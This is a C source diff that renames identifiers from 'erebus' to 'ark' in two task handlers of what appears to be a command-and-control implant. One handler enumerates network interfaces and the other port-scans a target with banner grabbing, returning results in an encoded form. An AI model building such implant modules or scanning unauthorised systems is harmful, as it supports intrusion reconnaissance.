@@ -13,15 +13,15 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#include "erebus/pb_c2.h"
-#include "erebus/task_handlers.h"
+#include "ark/pb_c2.h"
+#include "ark/task_handlers.h"
 
-int erebus_task_net_ifconfig(uint8_t **out, size_t *out_len) {
+int ark_task_net_ifconfig(uint8_t **out, size_t *out_len) {
     struct ifaddrs *ifaddr = NULL;
     if (getifaddrs(&ifaddr) != 0) return 0;
 
     size_t cap = 8, count = 0;
-    erebus_net_interface *ifaces = (erebus_net_interface *)calloc(cap, sizeof(*ifaces));
+    ark_net_interface *ifaces = (ark_net_interface *)calloc(cap, sizeof(*ifaces));
     if (!ifaces) { freeifaddrs(ifaddr); return 0; }
 
     for (struct ifaddrs *ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
@@ -30,7 +30,7 @@ int erebus_task_net_ifconfig(uint8_t **out, size_t *out_len) {
             continue;
 
         /* find or create iface by name */
-        erebus_net_interface *iface = NULL;
+        ark_net_interface *iface = NULL;
         for (size_t i = 0; i < count; i++) {
             if (strcmp(ifaces[i].name, ifa->ifa_name) == 0) {
                 iface = &ifaces[i];
@@ -40,7 +40,7 @@ int erebus_task_net_ifconfig(uint8_t **out, size_t *out_len) {
         if (!iface) {
             if (count >= cap) {
                 cap *= 2;
-                erebus_net_interface *n = (erebus_net_interface *)realloc(ifaces, cap * sizeof(*ifaces));
+                ark_net_interface *n = (ark_net_interface *)realloc(ifaces, cap * sizeof(*ifaces));
                 if (!n) goto fail;
                 ifaces = n;
             }
@@ -65,13 +65,13 @@ int erebus_task_net_ifconfig(uint8_t **out, size_t *out_len) {
     }
 
     freeifaddrs(ifaddr);
-    int ok = erebus_pb_encode_net_ifconfig_result(ifaces, count, out, out_len);
-    erebus_pb_free_net_ifconfig_result(ifaces, count);
+    int ok = ark_pb_encode_net_ifconfig_result(ifaces, count, out, out_len);
+    ark_pb_free_net_ifconfig_result(ifaces, count);
     return ok;
 
 fail:
     freeifaddrs(ifaddr);
-    erebus_pb_free_net_ifconfig_result(ifaces, count);
+    ark_pb_free_net_ifconfig_result(ifaces, count);
     return 0;
 }
 
@@ -124,14 +124,14 @@ static int try_connect(const char *host, uint16_t port, uint32_t timeout_ms, cha
     return open;
 }
 
-int erebus_task_net_portscan(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
-    erebus_portscan_task task;
-    if (!erebus_pb_decode_portscan_task(data, data_len, &task) || !task.target[0])
+int ark_task_net_portscan(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+    ark_portscan_task task;
+    if (!ark_pb_decode_portscan_task(data, data_len, &task) || !task.target[0])
         return 0;
     if (task.port_count == 0) return 0;
 
     uint32_t timeout = task.timeout_ms > 0 ? (uint32_t)task.timeout_ms : 500;
-    erebus_port_result *results = (erebus_port_result *)calloc(task.port_count, sizeof(*results));
+    ark_port_result *results = (ark_port_result *)calloc(task.port_count, sizeof(*results));
     if (!results) return 0;
 
     for (size_t i = 0; i < task.port_count; i++) {
@@ -142,7 +142,7 @@ int erebus_task_net_portscan(const uint8_t *data, size_t data_len, uint8_t **out
         if (results[i].open && banner[0])
             strncpy(results[i].service, banner, sizeof(results[i].service) - 1);
     }
-    int ok = erebus_pb_encode_portscan_result(results, task.port_count, out, out_len);
+    int ok = ark_pb_encode_portscan_result(results, task.port_count, out, out_len);
     free(results);
     return ok;
 }
